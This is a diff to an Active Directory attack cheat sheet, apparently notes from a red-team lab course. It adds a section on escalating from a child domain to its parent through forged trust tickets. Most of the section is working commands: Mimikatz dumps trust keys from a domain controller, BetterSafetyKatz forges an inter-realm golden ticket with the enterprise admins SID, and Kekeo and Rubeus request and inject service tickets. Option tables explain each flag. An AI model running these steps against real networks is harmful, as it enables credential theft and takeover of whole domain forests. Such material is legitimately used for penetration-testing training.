@@ -19,6 +19,9 @@
   * [Kerberos Unconstrained Delegation](#privlege-escalation-using-kerberos-unconstrained-delegation)
   * [Kerberos Constrained Delegation](#privilege-escalation-using-kerberos-constrained-delegation)
   * [Kerberos Resource-Based Constrained Delegation](#privilege-escalation-using-kerberos-resourcebased-constrained-delegation)
+  * [Across Trust](#privilege-escalation-across-trust)
+  * [Privilege Escalation - Child to Parent](#privilege-escalation-child-to-parent)
+  * [Child to Parent - Trust Tickets](#privilege-escaltion-using-trust-tickets)
 * [Kerberos](#kerberos)
   * [Introduction](#introduction)
   * [Kerberos Delegation](#kerberos-delegation)
@@ -686,7 +689,78 @@ Use the AES key of the student machine with Rubeus and access dcorp-mgmt as ANY 
 ```
 Rubeus.exe s4u /user:<student_machine_username> /aes:<aes256_student_machine> /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt
 ```
+### Privilege Escalation Across Trust
+Two types of across trust:
+- Across Domains: two way trust relationship between domains
+- Across Forest: Trust relationship needs to be established
 
+### Privilege Escalation Child to Parent
+sIDHistory is a user attribute designed for scenarios where a user is moved from one domain to another. When a user's domain is changed, they get a new SID and the old SID is added to sIDHistory.
+
+sIDHistory can be abused in two ways of escalating privileges:
+- krbtgt hash of the child
+- Trust tickets
+
+### Privilege Escaltion using Trust Tickets
+What is required to forge trust tickets is, obviously, the trust key. Look for [IN] trust key from child to parent:
+```
+Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <domain_controller>
+
+or
+
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+```
+
+So we can forge an inter-realm TGT by running the following command:
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:<domain> /sid:<current_domain_sid> /sids:<enterprise_admins_group_parent_domain_sid> /rc4:<trust_key_rc4> /service:krbtgt /target:<target_domain> /ticket:c:\AD\Tools\trust_tkt.kirbi" "exit"
+```
+
+|  Options | Description  |
+|---|---|
+|  kerberos::golden | Name of the module  | 
+| /domain  | FQDN of the current domain  |
+| /sid | SID of the current domain |
+| /sids | SID of the enterprise admins group of the parent domain |
+| /rc4 | RC4 of the trust key |
+| /user | user to impersonate |
+| /service:krbtgt | target service in the parent domain |
+| /target | FQDN of the parent domain |
+| /ticket | Path where the ticket has to be saved |
+
+Abuse the ticket using Kekeo.
+
+Get a TGS for a service (CIFS below) in the target domain by using the forged Trust ticket
+```
+.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/<parent_domain_controller.domain>
+```
+
+Use the TGS to access the targeted service
+```
+.\kirbikator.exe lsa .\CIFS.<parent_domain_controller.domain.kirbi>
+```
+
+Of course tickets for other services can also be created.
+
+We can perform the same abuse usign Rubeus
+```
+C:\AD\Tools\Rubeus.exe silver /service:krbtgt/<current_domain> /rc4:<trust_key_rc4_hash> /sid:<current_domain_sid> /sids:<parent_domain_enterprise_admins_group_sid> /ldap /user:<user_to_impersonate> /nowrap
+```
+
+Use the forged ticket
+```
+C:\AD\Tools\Rubeus.exe asktgs /service:http/<parent_domain_controller.domain> /dc:<parent_domain_controller.domain> /ptt /ticket:<forged_ticket>
+```
+
+|  Options | Description  |
+|---|---|
+| silver | Name of the module  | 
+| /sid | SID of the current domain |
+| /sids | SID of the enterprise admins group of the parent domain |
+| /rc4 | RC4 of the trust key |
+| ldap | Retrieve PAC information from the current DC |
+| /user | user to impersonate |
+| /nowrap | no newlines in the output |
 
 <div style="page-break-after: always;"></div>
 
